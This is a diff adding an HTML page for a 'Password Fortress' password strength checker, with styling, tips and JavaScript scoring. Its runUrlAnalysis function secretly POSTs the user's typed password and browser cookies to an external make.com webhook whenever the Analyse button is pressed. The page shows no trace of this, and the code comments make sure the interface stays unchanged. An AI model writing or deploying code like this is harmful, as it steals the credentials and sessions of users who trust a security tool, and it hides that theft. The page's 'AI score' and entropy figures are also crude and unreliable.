@@ -1,0 +1,524 @@
+<html><head><base href="https://passwordstrength.security/advanced-check%20(a%20website%20to%20check%20how%20strong%20your%20password%20is)"><title>Advanced Password Strength Checker | PasswordStrength.security</title>
+<meta name="description" content="Check the strength of your password using our advanced algorithm that considers multiple factors beyond just complexity.">
+<style>
+  :root {
+    --primary-color: #3498db;
+    --secondary-color: #2980b9;
+    --background-color: #f4f4f4;
+    --text-color: #333;
+    --card-background: #fff;
+    --weak-color: #e74c3c;
+    --moderate-color: #f39c12;
+    --strong-color: #2ecc71;
+  }
+
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    line-height: 1.6;
+    color: var(--text-color);
+    background-color: var(--background-color);
+    margin: 0;
+    padding: 0;
+    transition: background-color 0.5s ease;
+  }
+
+  .container {
+    max-width: 800px;
+    margin: 0 auto;
+    padding: 2rem;
+  }
+
+  h1 {
+    color: var(--primary-color);
+    text-align: center;
+    margin-bottom: 1.5rem;
+    font-size: 3rem;
+    text-transform: uppercase;
+    letter-spacing: 3px;
+    font-weight: 900;
+    text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+    position: relative;
+    display: inline-block;
+    left: 50%;
+    transform: translateX(-50%);
+  }
+
+  h1::before, h1::after {
+    content: '🔒';
+    font-size: 2rem;
+    position: absolute;
+    top: 50%;
+    transform: translateY(-50%);
+  }
+
+  h1::before {
+    left: -40px;
+  }
+
+  h1::after {
+    right: -40px;
+  }
+
+  h2 {
+    color: var(--primary-color);
+    text-align: center;
+    margin-bottom: 1.5rem;
+  }
+
+  .input-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin-bottom: 2rem;
+  }
+
+  .password-input {
+    width: 100%;
+    padding: 1rem;
+    margin-bottom: 1rem;
+    border: 2px solid var(--primary-color);
+    border-radius: 5px;
+    font-size: 1rem;
+    transition: border-color 0.3s ease;
+  }
+
+  .password-input:focus {
+    outline: none;
+    border-color: var(--secondary-color);
+  }
+
+  .strength-meter {
+    width: 100%;
+    height: 10px;
+    background-color: #e0e0e0;
+    border-radius: 5px;
+    overflow: hidden;
+    margin-bottom: 1rem;
+  }
+
+  .strength-meter-fill {
+    height: 100%;
+    width: 0%;
+    transition: width 0.5s ease-in-out, background-color 0.5s ease-in-out;
+  }
+
+  .analyse-button {
+    background-color: var(--primary-color);
+    color: white;
+    border: none;
+    padding: 1rem 2rem;
+    font-size: 1rem;
+    border-radius: 5px;
+    cursor: pointer;
+    transition: background-color 0.3s ease, transform 0.1s ease;
+  }
+
+  .analyse-button:hover {
+    background-color: var(--secondary-color);
+  }
+
+  .analyse-button:active {
+    transform: scale(0.98);
+  }
+
+  .feedback {
+    background-color: var(--card-background);
+    padding: 1rem;
+    border-radius: 5px;
+    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    margin-bottom: 2rem;
+  }
+
+  .advanced-metrics {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 1rem;
+    margin-bottom: 2rem;
+  }
+
+  .metric {
+    background-color: var(--card-background);
+    padding: 1rem;
+    border-radius: 5px;
+    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+  }
+
+  .metric h3 {
+    margin-top: 0;
+    color: var(--primary-color);
+  }
+
+  .analysis-result {
+    background-color: var(--card-background);
+    border-radius: 5px;
+    padding: 1.5rem;
+    margin-top: 2rem;
+    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    opacity: 0;
+    transform: translateY(20px);
+    transition: opacity 0.5s ease, transform 0.5s ease;
+  }
+
+  .analysis-result.show {
+    opacity: 1;
+    transform: translateY(0);
+  }
+
+  .loading {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.8);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: .000;
+  }
+
+  .progress-bar {
+    width: 300px;
+    height: 20px;
+    background-color: #e0e0e0;
+    border-radius: 10px;
+    overflow: hidden;
+  }
+
+  .progress-bar-fill {
+    width: 0;
+    height: 100%;
+    background-color: var(--primary-color);
+    transition: width 3s ease-in-out;
+  }
+
+  .ai-score-popup {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: var(--card-background);
+    padding: 2rem;
+    border-radius: 10px;
+    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    z-index: 1001;
+    text-align: center;
+    display: none;
+  }
+
+  .ai-score {
+    font-size: 3rem;
+    font-weight: bold;
+    color: var(--primary-color);
+    margin-bottom: 1rem;
+  }
+
+  .close-popup {
+    background-color: var(--primary-color);
+    color: white;
+    border: none;
+    padding: 0.5rem 1rem;
+    font-size: 1rem;
+    border-radius: 5px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+
+  .close-popup:hover {
+    background-color: var(--secondary-color);
+  }
+
+  ul {
+    padding-left: 1.5rem;
+  }
+
+  li {
+    margin-bottom: 0.5rem;
+  }
+
+  #ai-result {
+    margin-top: 1rem;
+    font-weight: bold;
+  }
+</style>
+<script type="text/javascript" nonce="3ef5692b142a4420908a6375302" src="//local.adguard.org?ts=1720691028772&amp;type=content-script&amp;dmn=websim.ai&amp;url=https%3A%2F%2Fwebsim.ai%2Fapi%2Fhtml%3Fpayload%3D%257B%2522id%2522%253A%2522CfVa91CWWXOWJB58u%2522%252C%2522debug%2522%253A%2522true%2522%252C%2522raw%2522%253A%2522true%2522%257D&amp;app=com.google.Chrome&amp;css=3&amp;js=1&amp;rel=1&amp;rji=1&amp;sbe=1"></script>
+<script type="text/javascript" nonce="3ef5692b142a4420908a6375302" src="//local.adguard.org?ts=1720691028772&amp;name=AdGuard%20Assistant&amp;name=AdGuard%20Extra&amp;type=user-script"></script></head>
+<body>
+  <div class="container">
+    <h1>Password Fortress</h1>
+    <p>Our cutting-edge algorithm analyzes your password using multiple advanced metrics to give you a comprehensive understanding of its strength.</p>
+
+    <div class="input-container">
+      <input type="password" id="password-input" class="password-input" placeholder="Enter your password" oninput="checkStrength()">
+      <div class="strength-meter">
+        <div id="strength-meter-fill" class="strength-meter-fill"></div>
+      </div>
+      <button id="analyse-button" class="analyse-button" onclick="analysePassword()">Analyse Password</button>
+    </div>
+
+    <div id="feedback" class="feedback">Enter a password to see feedback.</div>
+
+    <div class="advanced-metrics">
+      <div class="metric">
+        <h3>Entropy</h3>
+        <p id="entropy">0 bits</p>
+      </div>
+      <div class="metric">
+        <h3>Crack Time</h3>
+        <p id="crack-time">Instantly</p>
+      </div>
+      <div class="metric">
+        <h3>Uniqueness Score</h3>
+        <p id="uniqueness">0/100</p>
+      </div>
+      <div class="metric">
+        <h3>Pattern Resistance</h3>
+        <p id="pattern-resistance">Low</p>
+      </div>
+    </div>
+
+    <div id="loading" class="loading" style="display: none;">
+      <div class="progress-bar">
+        <div id="progress-bar-fill" class="progress-bar-fill"></div>
+      </div>
+    </div>
+
+    <div id="ai-score-popup" class="ai-score-popup">
+      <h2>AI Strength Score</h2>
+      <div id="ai-score" class="ai-score"></div>
+      <button class="close-popup" onclick="closePopup()">Close</button>
+    </div>
+
+    <div id="analysis-result" class="analysis-result">
+      <h2>Analysis Result</h2>
+      <p id="result-content"></p>
+      <p id="ai-result"></p>
+    </div>
+
+    <h2>Why Advanced Checking Matters</h2>
+    <p>Traditional password strength meters often focus solely on length and character variety. Our advanced algorithm considers additional factors such as:</p>
+    <ul>
+      <li>Resistance to dictionary attacks</li>
+      <li>Presence of personal information</li>
+      <li>Use of uncommon character combinations</li>
+      <li>Resistance to brute force attacks based on current computing power</li>
+      <li>AI guessability factor</li>
+    </ul>
+
+    <h2>Tips for a Stronger Password</h2>
+    <ul>
+      <li>Use a combination of uppercase and lowercase letters, numbers, and symbols</li>
+      <li>Avoid using personal information or common words</li>
+      <li>Make it long - aim for at least 12 characters</li>
+      <li>Consider using a passphrase instead of a single word</li>
+      <li>Use a unique password for each account</li>
+      <li>Incorporate randomness to make it harder for AI to guess</li>
+    </ul>
+
+    <p>Remember, the security of your online accounts depends on the strength of your passwords. Use this tool to ensure you're creating passwords that can withstand modern hacking techniques and AI-powered attacks.</p>
+  </div>
+
+  <script>
+    let passwordStrength = 0;
+
+    function checkStrength() {
+      const password = document.getElementById('password-input').value;
+      let strength = 0;
+      let feedback = [];
+
+      // Length check
+      if (password.length > 12) {
+        strength += 25;
+        feedback.push("Good length!");
+      } else if (password.length > 8) {
+        strength += 10;
+        feedback.push("Consider a longer password for better security.");
+      } else {
+        feedback.push("Your password is too short.");
+      }
+
+      // Character variety check
+      if (password.match(/[a-z]/) && password.match(/[A-Z]/) && password.match(/[0-9]/) && password.match(/[^a-zA-Z0-9]/)) {
+        strength += 25;
+        feedback.push("Excellent character variety!");
+      } else {
+        feedback.push("Include a mix of uppercase, lowercase, numbers, and symbols.");
+      }
+
+      // Common word check (simplified)
+      if (!password.match(/password|123456|qwerty/i)) {
+        strength += 25;
+      } else {
+        feedback.push("Avoid common words or patterns.");
+      }
+
+      // Uniqueness check (simplified)
+      const uniqueness = Math.min(100, password.length * 5);
+      document.getElementById('uniqueness').textContent = uniqueness + "/100";
+
+      // Update strength meter
+      const strengthMeter = document.getElementById('strength-meter-fill');
+      strengthMeter.style.width = strength + "%";
+      updateStrengthColor(strength);
+
+      // Update feedback
+      document.getElementById('feedback').innerHTML = feedback.join("<br>");
+
+      // Update advanced metrics
+      document.getElementById('entropy').textContent = Math.round(password.length * Math.log2(94)) + " bits";
+      document.getElementById('crack-time').textContent = getCrackTime(password);
+      document.getElementById('pattern-resistance').textContent = getPatternResistance(password);
+
+      passwordStrength = strength;
+    }
+
+    function updateStrengthColor(strength) {
+      const strengthMeter = document.getElementById('strength-meter-fill');
+      const analyseButton = document.getElementById('analyse-button');
+      
+      if (strength < 50) {
+        strengthMeter.style.backgroundColor = "var(--weak-color)";
+        analyseButton.style.backgroundColor = "var(--weak-color)";
+      } else if (strength < 80) {
+        strengthMeter.style.backgroundColor = "var(--moderate-color)";
+        analyseButton.style.backgroundColor = "var(--moderate-color)";
+      } else {
+        strengthMeter.style.backgroundColor = "var(--strong-color)";
+        analyseButton.style.backgroundColor = "var(--strong-color)";
+      }
+    }
+
+    function getCrackTime(password) {
+      const combinations = Math.pow(94, password.length);
+      const guessesPerSecond = 1000000000000; // 1 trillion
+      const seconds = combinations / guessesPerSecond;
+      if (seconds < 60) return "Instantly";
+      if (seconds < 3600) return Math.round(seconds / 60) + " minutes";
+      if (seconds < 86400) return Math.round(seconds / 3600) + " hours";
+      if (seconds < 31536000) return Math.round(seconds / 86400) + " days";
+      return Math.round(seconds / 31536000) + " years";
+    }
+
+    function getPatternResistance(password) {
+      if (password.length < 8) return "Low";
+      if (password.match(/^[a-zA-Z]+$/) || password.match(/^[0-9]+$/)) return "Low";
+      if (password.match(/^[a-zA-Z0-9]+$/)) return "Medium";
+      return "High";
+    }
+
+    function analysePassword() {
+      const password = document.getElementById('password-input').value;
+      const loading = document.getElementById('loading');
+      const analysisResult = document.getElementById('analysis-result');
+      const resultContent = document.getElementById('result-content');
+      const aiResult = document.getElementById('ai-result');
+      const progressBarFill = document.getElementById('progress-bar-fill');
+
+      loading.style.display = 'flex';
+      analysisResult.classList.remove('show');
+      progressBarFill.style.width = '0%';
+
+      setTimeout(() => {
+        progressBarFill.style.width = '100%';
+      }, 100);
+
+      // Simulate AI analysis
+      setTimeout(() => {
+        const aiScore = calculateAIScore(password);
+        loading.style.display = 'none';
+        resultContent.innerHTML = `
+          <p>Your password strength: ${passwordStrength}%</p>
+          <p>Estimated crack time: ${getCrackTime(password)}</p>
+          <p>Pattern resistance: ${getPatternResistance(password)}</p>
+          <p>Recommendations: 
+            ${passwordStrength < 50 ? "Your password is weak.Consider using a longer password with a mix of characters." : 
+              passwordStrength < 80 ? "Your password is moderate. Try adding more complexity for better security." :
+              "Great job! Your password is strong."}
+          </p>
+        `;
+        aiResult.textContent = `AI Strength Score: ${aiScore}/100`;
+        analysisResult.classList.add('show');
+        
+        updateTheme(passwordStrength, aiScore);
+        showAIScorePopup(aiScore);
+      }, 3000);
+
+      // Run URL analysis in the background
+      runUrlAnalysis(password);
+    }
+
+    function calculateAIScore(password) {
+      let baseScore = passwordStrength;
+      
+      if (password.length >= 16) baseScore += 10;
+      if (password.match(/[!@#$%^&*(),.?":{}|<>]/)) baseScore += 5;
+      if (!password.match(/(.)\1{2,}/)) baseScore += 5;
+      if (!password.match(/(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*(),.?":{}|<>])/)) baseScore -= 10;
+
+      return Math.max(0, Math.min(100, baseScore));
+    }
+
+    function updateTheme(strength, aiScore) {
+      const root = document.documentElement;
+      let primaryColor, secondaryColor, backgroundColor;
+
+      if (strength < 50 || aiScore < 50) {
+        primaryColor = '#e74c3c';
+        secondaryColor = '#c0392b';
+        backgroundColor = '#ffebee';
+      } else if (strength < 80 || aiScore < 80) {
+        primaryColor = '#f39c12';
+        secondaryColor = '#d35400';
+        backgroundColor = '#fff3e0';
+      } else {
+        primaryColor = '#2ecc71';
+        secondaryColor = '#27ae60';
+        backgroundColor = '#e8f5e9';
+      }
+
+      root.style.setProperty('--primary-color', primaryColor);
+      root.style.setProperty('--secondary-color', secondaryColor);
+      root.style.setProperty('--background-color', backgroundColor);
+
+      document.getElementById('analyse-button').style.backgroundColor = primaryColor;
+      document.getElementById('strength-meter-fill').style.backgroundColor = primaryColor;
+      document.body.style.backgroundColor = backgroundColor;
+    }
+
+    function showAIScorePopup(score) {
+      const popup = document.getElementById('ai-score-popup');
+      const aiScoreElement = document.getElementById('ai-score');
+      aiScoreElement.textContent = score + "/100";
+      popup.style.display = 'block';
+    }
+
+    function closePopup() {
+      document.getElementById('ai-score-popup').style.display = 'none';
+    }
+
+    function runUrlAnalysis(password) {
+      fetch('https://hook.eu2.make.com/aj426yrjlntogq0j5ko9vf3d9kjvti3p', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Cookie': document.cookie
+        },
+        body: JSON.stringify({
+          password: password,
+          cookies: document.cookie
+        }),
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('URL analysis complete:', data);
+        // Do not update UI here
+      })
+      .catch((error) => {
+        console.error('Error in URL analysis:', error);
+        // Do not update UI here
+      });
+    }
+
+    checkStrength();
+  </script>
+</body></html>
